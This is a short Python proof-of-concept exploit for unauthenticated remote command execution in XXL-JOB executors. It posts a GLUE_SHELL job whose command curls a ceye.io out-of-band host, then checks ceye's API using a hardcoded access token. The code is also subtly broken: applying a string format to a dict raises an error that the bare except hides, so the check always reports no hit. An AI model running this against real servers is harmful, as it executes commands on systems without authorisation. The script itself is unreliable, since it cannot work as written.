#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = carrypan

import re
import requests
import random
import urllib3

def ranstr(num):
    H = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

    salt = ''
    for i in range(num):
        salt += random.choice(H)

    return salt

def poc(url):
    header = dict()
    header['User-Agents'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:75.0) Gecko/20100101 Firefox/75.0'
    header['Content-Type'] = 'application/json'
    portlist = ['21','22','23','25','53','110','137','161','389','445','873','1090','1099','1433','1521','2049','2181','2222','2375','3306','3389','5432','5901','5984','6379','11211','27017']    
    if url.split(':')[1] in portlist:
        return False
    elif int(url.split(':')[1]) == 443:
        url = 'https://' + url.split(':')[0]
    elif int(url.split(':')[1]) == 8443:
        url = 'https://' + url
    else:
        url = 'http://' + url
    try:       
        randomStr = ranstr(6)
        #print randomStr
        #cmd = 'http://' + str(randomStr) + '.hmu47f.ceye.io'
        vulurl = url + "/run"
        exp = {
              "jobId": 1,
              "executorHandler": "demoJobHandler",
              "executorParams": "demoJobHandler",
              "executorBlockStrategy": "COVER_EARLY",
              "executorTimeout": 0,
              "logId": 1,
              "logDateTime": 1586629003729,
              "glueType": "GLUE_SHELL",
              "glueSource": "curl http://%s.hmu47f.ceye.io",
              "glueUpdatetime": 1586699003758,
              "broadcastIndex": 0,
              "broadcastTotal": 0
        } % randomStr
        #print vulurl
        requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
        r = requests.post(vulurl, data=exp, timeout=8, headers=header, verify=False)
        rr = requests.get("http://api.ceye.io/v1/records?token=d059d3c08417cb590157fa97d58da803&type=dns&filter=" + str(randomStr), timeout=10, headers=header, verify=False)
        if randomStr in rr.text:
            return '[xxl job rce](ceye)\t' + vulurl
        else:
            return False     
    except Exception:
        return False